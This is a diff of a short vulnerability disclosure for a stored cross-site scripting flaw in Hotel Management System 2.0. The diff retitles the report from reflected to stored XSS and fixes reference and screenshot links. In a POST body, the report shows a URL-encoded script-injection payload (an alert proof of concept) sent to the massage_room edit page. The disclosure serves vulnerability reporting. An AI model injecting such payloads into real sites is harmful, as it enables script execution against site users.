@@ -1,10 +1,10 @@
-#### Title: Hotel Management System 2.0 Reflected Cross-Site Scripting
+#### Title: Hotel Management System 2.0 Stored Cross-Site Scripting
 #### Author: Ashish Kumar (https://www.linkedin.com/in/ashish-kumar-0b65a3184)
 #### Date: 03.07.2022
 #### Vendor: https://www.sourcecodester.com/users/tips23
 #### Software: https://www.sourcecodester.com/php-codeigniter-hotel-management-system-source-code
 #### Version: 2.0
-#### Reference: https://github.com/CyberThoth/CVE/blob/main/CVE/Hotel%20Management%20system/Cross%20Site%20Scripting(Refelected)/POC.md
+#### Reference: https://github.com/CyberThoth/CVE/blob/main/CVE/Hotel%20Management%20system/Cross%20Site%20Scripting(Stored)/POC.md
 
 #### Description：
 #### Hotel Management System is vulnerable to Stored cross-site scripting on the massage_room edit page. The "Massageroom Details" parameter in 'http://localhost/ci_hms/massage_room/edit/1' is vulnerable.
@@ -44,8 +44,6 @@ Connection: close
 massageroomOpenTime=11%3A00&massageroomCloseTime=18%3A00&massageroomDetails=%60%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%60%09%09%09%09
 ```
 
-![image](https://github.com/CyberThoth/CVE/blob/37f3162287d4da5362ea0a408bd0e1c970b39c3e/CVE/Library%20Management%20System%20with%20QR%20code%20Attendance/Cross%20Site%20Scripting(Stored)/1.png)
+![image](https://github.com/CyberThoth/CVE/blob/3071fcfdc929fce59f1f443928bfd0f6243d3c47/CVE/Hotel%20Management%20system/Cross%20Site%20Scripting(Stored)/1.png)
 
-![image](https://github.com/CyberThoth/CVE/blob/37f3162287d4da5362ea0a408bd0e1c970b39c3e/CVE/Library%20Management%20System%20with%20QR%20code%20Attendance/Cross%20Site%20Scripting(Stored)/2.png)
-
-![image](https://github.com/CyberThoth/CVE/blob/37f3162287d4da5362ea0a408bd0e1c970b39c3e/CVE/Library%20Management%20System%20with%20QR%20code%20Attendance/Cross%20Site%20Scripting(Stored)/3.png)
+![image](https://github.com/CyberThoth/CVE/blob/3071fcfdc929fce59f1f443928bfd0f6243d3c47/CVE/Hotel%20Management%20system/Cross%20Site%20Scripting(Stored)/2.png)
